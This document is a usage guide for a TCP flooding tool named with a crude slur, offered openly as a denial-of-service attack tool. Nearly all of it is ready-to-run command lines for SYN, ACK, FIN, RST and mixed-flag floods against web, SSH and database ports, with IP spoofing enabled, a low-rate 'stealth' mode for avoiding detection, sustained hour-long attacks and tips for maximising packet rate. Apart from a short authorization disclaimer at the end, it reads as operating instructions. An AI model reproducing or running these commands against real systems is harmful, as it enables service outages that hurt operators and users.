# TCP-RAPE Usage Examples

Practical examples of using the TCP-RAPE multi-vector attack tool.

---

## Example 1: Basic All-Attack Mode

Rotate through all attack types automatically:

```bash
sudo ./rape 192.168.1.100 80 300 60 100000 all
```

**What it does:**
- Target: 192.168.1.100:80
- Threads: 300
- Duration: 60 seconds
- Max PPS: 100,000
- Mode: Rotates through SYN, ACK, FIN, RST, PSH, URG, SYN-ACK, FIN-ACK, MIXED

**Expected output:**
```
[+] TCP-RAPE: Multi-Vector TCP Attack Tool
[+] Target: 192.168.1.100:80
[+] Threads: 300
[+] Duration: 60 seconds
[+] Max PPS: 100000
[+] Attack Mode: ALL
[*] Reverse path filtering disabled for IP spoofing
[*] Starting attack...

[LIVE] PPS: 98500 | Total: 5910000 | SYN: 656000 | ACK: 656000 | FIN: 656000 | RST: 656000 | PSH: 656000 | URG: 656000 | MIXED: 656000 | Mbps: 78.80
```

---

## Example 2: SYN Flood Only

Pure SYN flood to exhaust connection queue:

```bash
sudo ./rape 192.168.1.100 80 500 120 200000 syn
```

**What it does:**
- Sends only SYN packets
- Fills server's connection backlog
- 500 threads for maximum impact
- 200,000 PPS target

---

## Example 3: ACK Flood Attack

Resource consumption attack:

```bash
sudo ./rape 192.168.1.100 443 400 180 150000 ack
```

**What it does:**
- Targets HTTPS port (443)
- ACK packets consume server CPU
- 3-minute duration
- 150,000 PPS

---

## Example 4: Mixed Flags Attack

Confuse TCP state machines with random flag combinations:

```bash
sudo ./rape 192.168.1.100 80 600 300 250000 mixed
```

**What it does:**
- Random flag combinations
- Confuses connection state tracking
- 600 threads, 5-minute duration
- 250,000 PPS

---

## Example 5: High-Intensity Attack

Maximum intensity with all attack types:

```bash
sudo ./rape 192.168.1.100 80 1000 600 500000 all
```

**What it does:**
- 1000 threads
- 10-minute duration
- 500,000 PPS target
- All attack types rotating

**Warning:** This is extremely intensive. Use only on your own infrastructure.

---

## Example 6: SSH Port Attack

Target SSH service:

```bash
sudo ./rape 192.168.1.100 22 300 60 100000 all
```

**What it does:**
- Targets SSH port (22)
- Multi-vector attack
- Attempts to exhaust SSH connection limits

---

## Example 7: Web Server Attack

Target HTTP/HTTPS:

```bash
# HTTP
sudo ./rape 192.168.1.100 80 500 120 200000 all

# HTTPS
sudo ./rape 192.168.1.100 443 500 120 200000 all
```

---

## Example 8: Database Port Attack

Target database services:

```bash
# MySQL
sudo ./rape 192.168.1.100 3306 400 180 150000 all

# PostgreSQL
sudo ./rape 192.168.1.100 5432 400 180 150000 all
```

---

## Example 9: Specific Attack Types

### FIN Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 fin
```

### RST Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 rst
```

### PSH Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 psh
```

### URG Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 urg
```

### SYN-ACK Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 synack
```

### FIN-ACK Flood
```bash
sudo ./rape 192.168.1.100 80 300 60 100000 finack
```

---

## Example 10: Long-Duration Attack

Extended attack duration:

```bash
sudo ./rape 192.168.1.100 80 500 3600 200000 all
```

**What it does:**
- 1-hour duration (3600 seconds)
- Sustained multi-vector attack
- Tests server resilience over time

---

## Example 11: Low-Intensity Stealth Attack

Lower intensity to avoid detection:

```bash
sudo ./rape 192.168.1.100 80 100 300 50000 all
```

**What it does:**
- 100 threads (lower profile)
- 50,000 PPS (less noticeable)
- 5-minute duration
- Still rotates through all attack types

---

## Example 12: Monitoring During Attack

Run attack and monitor in separate terminals:

**Terminal 1: Run attack**
```bash
sudo ./rape 192.168.1.100 80 500 300 200000 all
```

**Terminal 2: Monitor target**
```bash
# Monitor connections
watch -n 1 'netstat -an | grep :80 | wc -l'

# Monitor CPU/Memory
top

# Monitor network
iftop -i eth0
```

---

## Example 13: Save Output to File

Log attack statistics:

```bash
sudo ./rape 192.168.1.100 80 500 300 200000 all | tee attack.log
```

This saves output to `attack.log` while displaying on screen.

---

## Example 14: Multiple Ports Attack

Attack multiple ports simultaneously (run in separate terminals):

**Terminal 1: Port 80**
```bash
sudo ./rape 192.168.1.100 80 300 300 150000 all
```

**Terminal 2: Port 443**
```bash
sudo ./rape 192.168.1.100 443 300 300 150000 all
```

**Terminal 3: Port 22**
```bash
sudo ./rape 192.168.1.100 22 300 300 150000 all
```

---

## Example 15: Stop Attack Gracefully

Press `CTRL+C` once to stop gracefully:

```
[!] CTRL+C pressed (1) - Stopping attack...
[*] Stopping attack...

=== Final Statistics ===
Total Packets Sent: 11100000
SYN Packets: 1230000
ACK Packets: 1230000
...
```

Press `CTRL+C` twice to force exit immediately.

---

## Performance Tips

1. **Thread Count**: 300-500 threads is optimal for most systems
2. **PPS Rate**: Start with 100k PPS, increase if system handles it
3. **Duration**: 60-300 seconds is typical for testing
4. **Attack Mode**: `all` mode is most effective (rotates through all types)

---

## Troubleshooting

### "Operation not permitted"
- Run with `sudo` - raw sockets require root privileges

### Low PPS
- Increase thread count
- Check network interface capacity
- Verify target is reachable

### High CPU usage
- Reduce thread count
- Lower PPS target
- Check system resources

---

## ⚠️ Important Notes

- Always test on your own infrastructure
- Never attack systems without authorization
- Understand local laws regarding network attacks
- Use responsibly for security research and testing

